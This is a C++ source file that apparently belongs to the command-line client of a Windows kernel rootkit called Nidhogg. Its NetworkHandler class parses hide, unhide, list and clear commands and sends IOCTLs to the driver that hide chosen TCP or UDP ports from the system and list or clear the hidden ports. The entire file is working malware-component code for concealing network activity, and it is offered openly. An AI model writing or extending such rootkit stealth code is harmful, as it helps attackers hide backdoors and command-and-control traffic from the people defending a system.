#include "pch.h"
#include "NetworkHandler.h"

/*
 * Description:
 * HandleCommand is responsible for handling a network related command.
 *
 * Parameters:
 * @command [_In_ std::string] -- The command to be handled.
 *
 * Returns:
 * There is no return value.
 */
void NetworkHandler::HandleCommand(_In_ std::string command) {
	std::vector<std::string> params = SplitStringBySpace(command);
	std::string commandName = params.at(0);
	params.erase(params.begin());

	if (commandName.compare("hide") == 0) {
		if (!CheckInput(params)) {
			PrintHelp();
			return;
		}
		USHORT portNumber = static_cast<USHORT>(atoi(params.at(1).c_str()));
		PortType portType = (params.at(2) == "tcp") ? PortType::TCP : PortType::UDP;
		bool remote = params.at(3) == "remote";
		Hide(portNumber, portType, remote, true) ? std::cout << "Port " << portNumber << " hidden" << std::endl :
			std::cerr << "Failed to hide port " << portNumber << std::endl;
	}
	else if (commandName.compare("unhide") == 0 || commandName.compare("restore") == 0) {
		if (!CheckInput(params)) {
			PrintHelp();
			return;
		}
		USHORT portNumber = static_cast<USHORT>(atoi(params.at(1).c_str()));
		PortType portType = (params.at(2) == "tcp") ? PortType::TCP : PortType::UDP;
		bool remote = params.at(3) == "remote";
		Hide(portNumber, portType, !remote, false) ? std::cout << "Port " << portNumber << " unhidden" << std::endl :
			std::cerr << "Failed to unhide port " << portNumber << std::endl;
	}
	else if (commandName.compare("list") == 0) {
		if (params.size() != 1) {
			std::cerr << "Invalid usage" << std::endl;
			PrintHelp();
			return;
		}
		auto hiddenPorts = ListHiddenPorts();

		if (hiddenPorts.empty()) {
			std::cout << "No hidden ports found." << std::endl;
			return;
		}
		for (const auto& port : hiddenPorts) {
			std::cout << "[+] Port: " << port.Port
				<< ", Type: " << ((port.Type == PortType::TCP) ? "TCP" : "UDP")
				<< ", Remote: "
				<< (port.Remote ? "Yes" : "No") << std::endl;
		}
	}
	else if (commandName.compare("clear") == 0) {
		if (params.size() != 1) {
			std::cerr << "Invalid usage" << std::endl;
			PrintHelp();
			return;
		}
		if (ClearHiddenPorts()) {
			std::cout << "All hidden ports cleared." << std::endl;
		} else {
			std::cerr << "Failed to clear hidden ports." << std::endl;
		}
	}
	else {
		std::cerr << "Invalid option!" << std::endl;
		PrintHelp();
	}
}

/*
* Description:
* CheckInput is responsible for checking the input parameters for the hide command.
*
* Parameters:
* @params [_In_ const std::vector<std::string>&] -- The input parameters to be checked.
*
* Returns:
* @bool					-- Whether the input parameters are valid or not.
*/
bool NetworkHandler::CheckInput(_In_ const std::vector<std::string>& params) {
	if (params.size() != 4) {
		std::cerr << "Invalid usage" << std::endl;
		PrintHelp();
		return false;
	}
	if (params.at(1).empty() || !std::all_of(params.at(1).begin(), params.at(1).end(), ::isdigit)) {
		std::cerr << "Invalid port number" << std::endl;
		return false;
	}
	USHORT portNumber = static_cast<USHORT>(atoi(params.at(1).c_str()));

	if (portNumber == 0 || portNumber > 65535) {
		std::cerr << "Port number must be between 1 and 65535" << std::endl;
		return false;
	}
	if (params.at(2) != "tcp" && params.at(2) != "udp") {
		std::cerr << "Invalid port type. Use 'tcp' or 'udp'." << std::endl;
		return false;
	}
	if (params.at(3) != "remote" && params.at(3) != "local") {
		std::cerr << "Invalid remote/local option. Use 'remote' or 'local'." << std::endl;
		return false;
	}
	return true;
}

/*
 * Description:
 * Hide is responsible for issuing a IOCTL_HIDE_UNHIDE_PORT to hide or unhide a port.
 *
 * Parameters:
 * @portNumber [_In_ USHORT] -- The port number to be hidden or unhidden.
 * @portType   [_In_ PortType] -- The type of the port (TCP/UDP).
 * @remote     [_In_ bool] -- Whether the port is remote or local.
 * @hide       [_In_ bool] -- Whether to hide (true) or unhide (false) the port.
 *
 * Returns:
 * @bool					-- Whether the operation was successful or not.
 */
bool NetworkHandler::Hide(_In_ USHORT portNumber, _In_ PortType portType, _In_ bool remote, _In_ bool hide) {
	DWORD returned;
	InputHiddenPort hiddenPort{};
	hiddenPort.Hide = hide;
	hiddenPort.Port = portNumber;
	hiddenPort.Remote = remote;
	hiddenPort.Type = portType;
	return DeviceIoControl(this->hNidhogg.get(), IOCTL_HIDE_UNHIDE_PORT,
		&hiddenPort, sizeof(hiddenPort),
		nullptr, 0, &returned, nullptr);
}

/*
 * Description:
 * ListHiddenPorts is responsible for issuing a IOCTL_QUERY_HIDDEN_PORTS to get all hidden ports.
 *
 * Parameters:
 * There are no parameters
 *
 * Returns:
 * @hiddenPorts [std::vector<HiddenPort>] -- Hidden ports.
 */
std::vector<HiddenPort> NetworkHandler::ListHiddenPorts() {
	DWORD returned;
	OutputHiddenPorts rawHiddenPorts{};
	std::vector<HiddenPort> hiddenPorts;

	if (!DeviceIoControl(this->hNidhogg.get(), IOCTL_QUERY_HIDDEN_PORTS,
		nullptr, 0, &rawHiddenPorts, sizeof(rawHiddenPorts), &returned, nullptr)) {
		return hiddenPorts;
	}
	for (ULONG i = 0; i < rawHiddenPorts.PortsCount; i++) {
		HiddenPort port{};
		port.Port = rawHiddenPorts.Ports[i].Port;
		port.Type = rawHiddenPorts.Ports[i].Type;
		port.Remote = rawHiddenPorts.Ports[i].Remote;
		hiddenPorts.push_back(port);
	}
	return hiddenPorts;
}

/*
* Description:
* ClearHiddenPorts is responsible for issuing a IOCTL_CLEAR_HIDDEN_PORTS to clear all hidden ports.
*
* Parameters:
* There are no parameters
*
* Returns:
* @bool					-- Whether the operation was successful or not.
*/
bool NetworkHandler::ClearHiddenPorts() {
	DWORD returned;
	return DeviceIoControl(this->hNidhogg.get(), IOCTL_CLEAR_HIDDEN_PORTS,
		nullptr, 0, nullptr, 0, &returned, nullptr);
}
